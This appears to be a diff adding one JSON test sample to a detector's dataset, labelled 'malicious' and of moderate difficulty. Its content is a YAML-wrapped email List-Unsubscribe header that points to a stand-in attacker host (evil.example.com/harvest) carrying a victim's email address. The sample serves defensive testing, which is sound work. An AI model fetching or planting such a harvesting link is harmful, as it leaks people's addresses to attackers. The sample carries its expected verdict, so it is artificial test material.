@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::email-webfetch::123::structural-variations::6",
+  "base_sample_id": "exp::email-webfetch::123",
+  "generator_id": "structural-variations",
+  "generator_version": "1.0.0",
+  "seed": 1079107284,
+  "content": "data: |\n  List-Unsubscribe: <http://evil.example.com/harvest?email=victim@target.example.com>\n  ",
+  "content_hash": "16702e079cfa5e80176929fb3dc72b95073260c89afb3182582c82b8b8204d46",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "structural:yaml",
+  "difficulty": "moderate"
+}
